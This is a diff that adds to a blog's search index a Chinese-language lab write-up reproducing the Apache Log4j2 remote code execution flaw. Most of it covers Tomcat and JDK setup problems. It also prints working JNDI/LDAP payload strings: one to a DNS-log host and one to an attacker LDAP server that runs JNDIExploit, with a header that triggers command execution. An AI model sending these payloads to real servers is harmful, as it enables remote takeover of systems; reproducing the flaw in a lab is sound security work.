@@ -1085,4 +1085,52 @@ Windows 10 Version 1809 for 32-bit Systems</p>
         <tag>bypass</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Apache - Log4j2 RCE复现</title>
+    <url>/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<img src="/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/icloud.png" class="">
+<h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
+<p>使用<code>T00ls</code>大佬的环境，<code>war</code>包放到<code>webapps</code>下重启<code>tomcat</code>即可</p>
+<div class="note info"><p>阅读本篇文章能了解到：apache, rce，Log4j2</p></div>
+<a id="more"></a>
+<blockquote>
+<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1">https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1</a></p>
+</blockquote>
+<p>这里我要多说几句，因为我用的<code>jspstudy</code>，搭建环境踩了不少坑，记录下，主要是<code>jspstudy</code>的坑</p>
+<p>首先把<code>war</code>包放到<code>webapps</code>下并不会自解压，放到<code>www</code>一样不解压</p>
+<p>解决方案：<code>JspStudy\tomcat\conf</code>文件夹下<code>server.xml</code>，注释掉<code>&lt;Context docBase=&quot;D:\JspStudy\WWW\&quot; path=&quot;&quot;&gt;&lt;/Context&gt;</code>，放到<code>webapps</code>即可自解压</p>
+<p>设置根目录为<code>D:\JspStudy\WWW\ROOT</code>，访问<code>http://127.0.0.1:8080</code>，页面正常</p>
+<p>提交<code>payload</code>，报500错</p>
+<p><img src="500.png" alt="500"></p>
+<p>经查，大概是<code>jdk</code>版本问题，打开<code>jdk</code>目录查看<code>java</code>版本为<code>1.7.0_60</code>，盲猜版本过低</p>
+<p>解决方案：安装<code>jre1.8</code>32位，拷贝<code>bin</code>、<code>lib</code>目录，替换<code>JspStudy\JDK\jre\</code>，替换前先把<code>bin</code>目录下<code>java-JspStudy.exe</code>备份一份，替换后再拷贝进去</p>
+<p>重启<code>tomcat</code>解决500错误，8错，nice，我已经准备不再用他了😅</p>
+<h2 id="RCE"><a class="header-anchor" href="#RCE">¶</a>RCE</h2>
+<h3 id="1-dnslog"><a class="header-anchor" href="#1-dnslog">¶</a>1. dnslog</h3>
+<p>先使用dns测试漏洞</p>
+<blockquote>
+<p>payload: ${jndi:ldap://redn3ck.xxx.ceye.io}</p>
+</blockquote>
+<p><img src="dns.png" alt="dns"></p>
+<h3 id="2-rce"><a class="header-anchor" href="#2-rce">¶</a>2. rce</h3>
+<p>下载<a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a>，跑起服务</p>
+<p><img src="JNDIExploit.png" alt="JNDIExploit"></p>
+<blockquote>
+<p>payload: ${jndi:ldap://207.xxx.xxx.111:1389/TomcatBypass/TomcatEcho}</p>
+</blockquote>
+<p><code>hearder</code>中填入<code>Cmd: cmd</code>即可<code>rce</code></p>
+<p><img src="rce.png" alt="rce"></p>
+<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
+<blockquote>
+<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695">https://www.t00ls.cc/viewthread.php?tid=63695</a><br>
+<a href="https://www.t00ls.cc/viewthread.php?tid=63705">https://www.t00ls.cc/viewthread.php?tid=63705</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>apache</tag>
+        <tag>rce</tag>
+        <tag>Log4j2</tag>
+      </tags>
+  </entry>
 </search>
